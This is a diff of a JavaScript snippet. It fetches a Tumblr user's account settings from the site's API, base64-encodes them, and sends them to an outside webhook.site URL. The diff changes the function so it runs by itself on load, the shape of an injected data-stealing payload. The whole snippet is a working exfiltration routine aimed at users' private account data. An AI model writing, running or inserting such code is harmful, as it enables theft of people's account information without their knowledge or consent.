@@ -1,4 +1,4 @@
-async function getData() {
+(async () => {
   try {
     const response = await fetch("https://www.tumblr.com/api/v2/user/settings", {
       headers: {
@@ -18,11 +18,12 @@ async function getData() {
     const base64Data = btoa(jsonString);
 
     console.log("Base64:", base64Data);
+
     const webhookUrl = "https://webhook.site/e24b5b15-681f-477f-b84b-4386fe117c80";
     const sendResponse = await fetch(`${webhookUrl}?info=${encodeURIComponent(base64Data)}`);
 
-    console.log(sendResponse.status);
+    console.log("Webhook status:", sendResponse.status);
   } catch (error) {
     console.error(error.message);
   }
-}
+})();
